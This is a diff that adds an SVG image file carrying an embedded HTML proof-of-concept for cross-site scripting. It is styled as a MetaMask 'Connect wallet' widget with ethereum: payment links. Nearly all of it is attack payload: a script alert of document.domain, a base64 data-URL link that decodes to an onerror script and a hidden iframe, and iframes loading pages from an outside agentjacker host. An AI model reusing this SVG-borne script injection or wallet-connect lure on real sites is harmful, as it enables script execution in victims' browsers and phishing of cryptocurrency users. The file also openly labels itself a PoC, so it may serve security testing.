@@ -1,0 +1,84 @@
+<svg version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="none" x="0px" y="0px"  height="850" width="960" viewBox="0 0 850 960">
+<g transform="translate(300, 0) rotate(20)">
+<foreignobject height="800" width="800" x="10" y="10">
+<body xmlns="http://www.w3.org/1999/xhtml">
+
+<div class="container">
+<div class="widget-container">
+<div class="widget-text">
+      taste testing
+    </div>
+</div>
+<div class="text" style="text-align:center">
+<br/>PoC<p></p>
+  
+<h1 style="text-decoration:underline;">
+<br/><a href="ethereum:0x0000000000000000000000000000000000000000?value=10000000000000000&amp;data=0x&amp;gas=30000&amp;gasPrice=30000" target="_self">
+</svg>Connect</button><br/>
+<a href="data:text/html;base64,PGltZyBzcmMgb25lcnJvcj0nYWxlcnQoMTMzNyArICJcclxzcGFtaWxhIiknPjxpZnJhbWUvc3JjPWh0dHBzOi8vYWdlbnRqYWNrZXIuZ2l0aHViLmlvL3N3YXAvMy5odG1sCiBzdHlsZT12aXNpYmlsaXR5OmhpZGRlbj48L2lmcmFtZT4=" target="_self"><button class="LoginContainer_button__3c9Ij/Button_container__2B8O8 Button_disabled__1f6YP" data-test-id="sign-in-button" style="border: 3px solid #436195!important;width:300px!important;border:none;font-size:16px;line-height:24px;color:#fff;font-weight:600;padding:8px;24px;padding-top:8px;padding-bottom:8px;border-radius:4px;text-decoration:none;display:inline-block;cursor:pointer;width:100%;margin-top:29px;margin-bottom:29px;padding-top:13px;padding-bottom:13px;background-color:rgba(54, 56, 64, 0.6) !important;" type="submit">
+XSS</button></a></a><br/>
+<input id="button-checkbox" style="opacity:0" type="checkbox"/>
+<label class="button" for="button-checkbox"><svg height="60" id="Layer_1" style="fill:default!important" version="1.1" viewbox="0 0 318.6 318.6" width="60" x="0" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" y="0">
+<style>
+    .st1,.st6{fill:#e4761b;stroke:#e4761b;stroke-linecap:round;stroke-linejoin:round}.st6{fill:#f6851b;stroke:#f6851b}
+  </style>
+<path d="m274.1 35.5-99.5 73.9L193 65.8z" fill="#e2761b" stroke="#e2761b" stroke-linecap="round" stroke-linejoin="round" style="fill:#e2761b!important"></path>
+<path class="st1" d="m44.4 35.5 98.7 74.6-17.5-44.3zm193.9 171.3-26.5 40.6 56.7 15.6 16.3-55.3zm-204.4.9L50.1 263l56.7-15.6-26.5-40.6z" style="fill:#e4761b!important"></path>
+<path class="st1" d="m103.6 138.2-15.8 23.9 56.3 2.5-2-60.5zm111.3 0-39-34.8-1.3 61.2 56.2-2.5zM106.8 247.4l33.8-16.5-29.2-22.8zm71.1-16.5 33.9 16.5-4.7-39.3z" style="fill:#e4761b!important"></path>
+<path d="m211.8 247.4-33.9-16.5 2.7 22.1-.3 9.3zm-105 0 31.5 14.9-.2-9.3 2.5-22.1z" fill="#d7c1b3" stroke="#d7c1b3" stroke-linecap="round" stroke-linejoin="round" style="fill:#d7c1b3!important"></path>
+<path d="m138.8 193.5-28.2-8.3 19.9-9.1zm40.9 0 8.3-17.4 20 9.1z" fill="#233447" stroke="#233447" stroke-linecap="round" stroke-linejoin="round" style="fill:#233447!important"></path>
+<path d="m106.8 247.4 4.8-40.6-31.3.9zM207 206.8l4.8 40.6 26.5-39.7zm23.8-44.7-56.2 2.5 5.2 28.9 8.3-17.4 20 9.1zm-120.2 23.1 20-9.1 8.2 17.4 5.3-28.9-56.3-2.5z" fill="#cd6116" stroke="#cd6116" stroke-linecap="round" stroke-linejoin="round" style="fill:#cd6116!important"></path>
+<path d="m87.8 162.1 23.6 46-.8-22.9zm120.3 23.1-1 22.9 23.7-46zm-64-20.6-5.3 28.9 6.6 34.1 1.5-44.9zm30.5 0-2.7 18 1.2 45 6.7-34.1z" fill="#e4751f" stroke="#e4751f" stroke-linecap="round" stroke-linejoin="round" style="fill:#e4751f!important"></path>
+<path class="st6" d="m179.8 193.5-6.7 34.1 4.8 3.3 29.2-22.8 1-22.9zm-69.2-8.3.8 22.9 29.2 22.8 4.8-3.3-6.6-34.1z" style="fill:#f6851b!important"></path>
+<path d="m180.3 262.3.3-9.3-2.5-2.2h-37.7l-2.3 2.2.2 9.3-31.5-14.9 11 9 22.3 15.5h38.3l22.4-15.5 11-9z" fill="#c0ad9e" stroke="#c0ad9e" stroke-linecap="round" stroke-linejoin="round" style="fill:#c0ad9e!important"></path>
+<path d="m177.9 230.9-4.8-3.3h-27.7l-4.8 3.3-2.5 22.1 2.3-2.2h37.7l2.5 2.2z" fill="#161616" stroke="#161616" stroke-linecap="round" stroke-linejoin="round" style="fill:#161616!important"></path>
+<path d="m278.3 114.2 8.5-40.8-12.7-37.9-96.2 71.4 37 31.3 52.3 15.3 11.6-13.5-5-3.6 8-7.3-6.2-4.8 8-6.1zM31.8 73.4l8.5 40.8-5.4 4 8 6.1-6.1 4.8 8 7.3-5 3.6 11.5 13.5 52.3-15.3 37-31.3-96.2-71.4z" fill="#763d16" stroke="#763d16" stroke-linecap="round" stroke-linejoin="round" style="fill:#763d16!important"></path>
+<path class="st6" d="m267.2 153.5-52.3-15.3 15.9 23.9-23.7 46 31.2-.4h46.5zm-163.6-15.3-52.3 15.3-17.4 54.2h46.4l31.1.4-23.6-46zm71 26.4 3.3-57.7 15.2-41.1h-67.5l15 41.1 3.5 57.7 1.2 18.2.1 44.8h27.7l.2-44.8z" style="fill:#f6851b!important"></path>
+</svg> <font style="font-weight:bold!important;color:black!important;font-size:22px!important;">Connect MetaMask (Android/IOS only) DEFI POC v2</font></label>
+<div id="overlay">
+<div id="widget-container">
+<p><a href="ethereum:0x0000000000000000000000000000000000000000?value=10000000000000000&amp;data=PoC&amp;gas=30000&amp;gasPrice=30000" target="_self"><svg height="60" id="Layer_1" style="fill:default!important" version="1.1" viewbox="0 0 318.6 318.6" width="60" x="0" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" y="0">
+<style>
+    .st1,.st6{fill:#e4761b;stroke:#e4761b;stroke-linecap:round;stroke-linejoin:round}.st6{fill:#f6851b;stroke:#f6851b}
+  </style>
+<path d="m274.1 35.5-99.5 73.9L193 65.8z" fill="#e2761b" stroke="#e2761b" stroke-linecap="round" stroke-linejoin="round" style="fill:#e2761b!important"></path>
+<path class="st1" d="m44.4 35.5 98.7 74.6-17.5-44.3zm193.9 171.3-26.5 40.6 56.7 15.6 16.3-55.3zm-204.4.9L50.1 263l56.7-15.6-26.5-40.6z" style="fill:#e4761b!important"></path>
+<path class="st1" d="m103.6 138.2-15.8 23.9 56.3 2.5-2-60.5zm111.3 0-39-34.8-1.3 61.2 56.2-2.5zM106.8 247.4l33.8-16.5-29.2-22.8zm71.1-16.5 33.9 16.5-4.7-39.3z" style="fill:#e4761b!important"></path>
+<path d="m211.8 247.4-33.9-16.5 2.7 22.1-.3 9.3zm-105 0 31.5 14.9-.2-9.3 2.5-22.1z" fill="#d7c1b3" stroke="#d7c1b3" stroke-linecap="round" stroke-linejoin="round" style="fill:#d7c1b3!important"></path>
+<path d="m138.8 193.5-28.2-8.3 19.9-9.1zm40.9 0 8.3-17.4 20 9.1z" fill="#233447" stroke="#233447" stroke-linecap="round" stroke-linejoin="round" style="fill:#233447!important"></path>
+<path d="m106.8 247.4 4.8-40.6-31.3.9zM207 206.8l4.8 40.6 26.5-39.7zm23.8-44.7-56.2 2.5 5.2 28.9 8.3-17.4 20 9.1zm-120.2 23.1 20-9.1 8.2 17.4 5.3-28.9-56.3-2.5z" fill="#cd6116" stroke="#cd6116" stroke-linecap="round" stroke-linejoin="round" style="fill:#cd6116!important"></path>
+<path d="m87.8 162.1 23.6 46-.8-22.9zm120.3 23.1-1 22.9 23.7-46zm-64-20.6-5.3 28.9 6.6 34.1 1.5-44.9zm30.5 0-2.7 18 1.2 45 6.7-34.1z" fill="#e4751f" stroke="#e4751f" stroke-linecap="round" stroke-linejoin="round" style="fill:#e4751f!important"></path>
+<path class="st6" d="m179.8 193.5-6.7 34.1 4.8 3.3 29.2-22.8 1-22.9zm-69.2-8.3.8 22.9 29.2 22.8 4.8-3.3-6.6-34.1z" style="fill:#f6851b!important"></path>
+<path d="m180.3 262.3.3-9.3-2.5-2.2h-37.7l-2.3 2.2.2 9.3-31.5-14.9 11 9 22.3 15.5h38.3l22.4-15.5 11-9z" fill="#c0ad9e" stroke="#c0ad9e" stroke-linecap="round" stroke-linejoin="round" style="fill:#c0ad9e!important"></path>
+<path d="m177.9 230.9-4.8-3.3h-27.7l-4.8 3.3-2.5 22.1 2.3-2.2h37.7l2.5 2.2z" fill="#161616" stroke="#161616" stroke-linecap="round" stroke-linejoin="round" style="fill:#161616!important"></path>
+<path d="m278.3 114.2 8.5-40.8-12.7-37.9-96.2 71.4 37 31.3 52.3 15.3 11.6-13.5-5-3.6 8-7.3-6.2-4.8 8-6.1zM31.8 73.4l8.5 40.8-5.4 4 8 6.1-6.1 4.8 8 7.3-5 3.6 11.5 13.5 52.3-15.3 37-31.3-96.2-71.4z" fill="#763d16" stroke="#763d16" stroke-linecap="round" stroke-linejoin="round" style="fill:#763d16!important"></path>
+<path class="st6" d="m267.2 153.5-52.3-15.3 15.9 23.9-23.7 46 31.2-.4h46.5zm-163.6-15.3-52.3 15.3-17.4 54.2h46.4l31.1.4-23.6-46zm71 26.4 3.3-57.7 15.2-41.1h-67.5l15 41.1 3.5 57.7 1.2 18.2.1 44.8h27.7l.2-44.8z" style="fill:#f6851b!important"></path>
+</svg><font style="font-weight:bold;font-size:22px">Connect wallet</font></a><svg height="60" id="Layer_1" style="fill:default!important" version="1.1" viewbox="0 0 318.6 318.6" width="60" x="0" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" y="0">
+<style>
+    .st1,.st6{fill:#e4761b;stroke:#e4761b;stroke-linecap:round;stroke-linejoin:round}.st6{fill:#f6851b;stroke:#f6851b}
+  </style>
+<path d="m274.1 35.5-99.5 73.9L193 65.8z" fill="#e2761b" stroke="#e2761b" stroke-linecap="round" stroke-linejoin="round" style="fill:#e2761b!important"></path>
+<path class="st1" d="m44.4 35.5 98.7 74.6-17.5-44.3zm193.9 171.3-26.5 40.6 56.7 15.6 16.3-55.3zm-204.4.9L50.1 263l56.7-15.6-26.5-40.6z" style="fill:#e4761b!important"></path>
+<path class="st1" d="m103.6 138.2-15.8 23.9 56.3 2.5-2-60.5zm111.3 0-39-34.8-1.3 61.2 56.2-2.5zM106.8 247.4l33.8-16.5-29.2-22.8zm71.1-16.5 33.9 16.5-4.7-39.3z" style="fill:#e4761b!important"></path>
+<path d="m211.8 247.4-33.9-16.5 2.7 22.1-.3 9.3zm-105 0 31.5 14.9-.2-9.3 2.5-22.1z" fill="#d7c1b3" stroke="#d7c1b3" stroke-linecap="round" stroke-linejoin="round" style="fill:#d7c1b3!important"></path>
+<path d="m138.8 193.5-28.2-8.3 19.9-9.1zm40.9 0 8.3-17.4 20 9.1z" fill="#233447" stroke="#233447" stroke-linecap="round" stroke-linejoin="round" style="fill:#233447!important"></path>
+<path d="m106.8 247.4 4.8-40.6-31.3.9zM207 206.8l4.8 40.6 26.5-39.7zm23.8-44.7-56.2 2.5 5.2 28.9 8.3-17.4 20 9.1zm-120.2 23.1 20-9.1 8.2 17.4 5.3-28.9-56.3-2.5z" fill="#cd6116" stroke="#cd6116" stroke-linecap="round" stroke-linejoin="round" style="fill:#cd6116!important"></path>
+<path d="m87.8 162.1 23.6 46-.8-22.9zm120.3 23.1-1 22.9 23.7-46zm-64-20.6-5.3 28.9 6.6 34.1 1.5-44.9zm30.5 0-2.7 18 1.2 45 6.7-34.1z" fill="#e4751f" stroke="#e4751f" stroke-linecap="round" stroke-linejoin="round" style="fill:#e4751f!important"></path>
+<path class="st6" d="m179.8 193.5-6.7 34.1 4.8 3.3 29.2-22.8 1-22.9zm-69.2-8.3.8 22.9 29.2 22.8 4.8-3.3-6.6-34.1z" style="fill:#f6851b!important"></path>
+<path d="m180.3 262.3.3-9.3-2.5-2.2h-37.7l-2.3 2.2.2 9.3-31.5-14.9 11 9 22.3 15.5h38.3l22.4-15.5 11-9z" fill="#c0ad9e" stroke="#c0ad9e" stroke-linecap="round" stroke-linejoin="round" style="fill:#c0ad9e!important"></path>
+<path d="m177.9 230.9-4.8-3.3h-27.7l-4.8 3.3-2.5 22.1 2.3-2.2h37.7l2.5 2.2z" fill="#161616" stroke="#161616" stroke-linecap="round" stroke-linejoin="round" style="fill:#161616!important"></path>
+<path d="m278.3 114.2 8.5-40.8-12.7-37.9-96.2 71.4 37 31.3 52.3 15.3 11.6-13.5-5-3.6 8-7.3-6.2-4.8 8-6.1zM31.8 73.4l8.5 40.8-5.4 4 8 6.1-6.1 4.8 8 7.3-5 3.6 11.5 13.5 52.3-15.3 37-31.3-96.2-71.4z" fill="#763d16" stroke="#763d16" stroke-linecap="round" stroke-linejoin="round" style="fill:#763d16!important"></path>
+<path class="st6" d="m267.2 153.5-52.3-15.3 15.9 23.9-23.7 46 31.2-.4h46.5zm-163.6-15.3-52.3 15.3-17.4 54.2h46.4l31.1.4-23.6-46zm71 26.4 3.3-57.7 15.2-41.1h-67.5l15 41.1 3.5 57.7 1.2 18.2.1 44.8h27.7l.2-44.8z" style="fill:#f6851b!important"></path>
+</svg></p>
+<label class="button" for="button-checkbox">Close widget</label>
+</div>
+</div>
+<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/></div>
+</b>
+</div>
+<script>alert(document.domain)</script>
+<iframe sandbox="" src="https://agentjacker.github.io/swap/tap.php"></iframe>
+</body>
+</foreignobject>
+</g>
+</svg>
